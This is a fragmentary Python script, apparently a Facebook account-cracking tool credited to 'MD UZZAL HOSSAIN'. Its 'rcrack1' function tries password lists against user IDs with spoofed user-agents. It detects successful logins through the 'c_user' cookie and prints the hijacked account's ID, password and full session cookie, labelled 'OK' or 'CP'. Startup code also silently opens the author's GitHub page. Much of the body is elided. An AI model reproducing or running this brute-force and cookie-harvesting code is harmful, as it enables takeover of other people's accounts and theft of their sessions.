#Create By: MD UZZAL HOSSAIN
#Decode By: KING UZZAL
...
for xd in range(10000):
    ...
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)
os.system('xdg-open https://github.com/Uzzalvau')
logo = ("""
_   _ __________   _    _     
| | | |__  |__  /  / \  | |    
| | | | / /  / /  / _ \ | |    
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92mUZZAL\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
          ...
          'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[UZZAL -OK] {uid} | {ps}")
                print(f" Cookie : {coki}")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[UZZAL -CP] {cid} | {ps}")
                ...
                continue
        loop+=1
        #sys.stdout.write(f'\r\033[m[UZZAL ] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        #sys.stdout.flush()
    except:
        pass
Main()
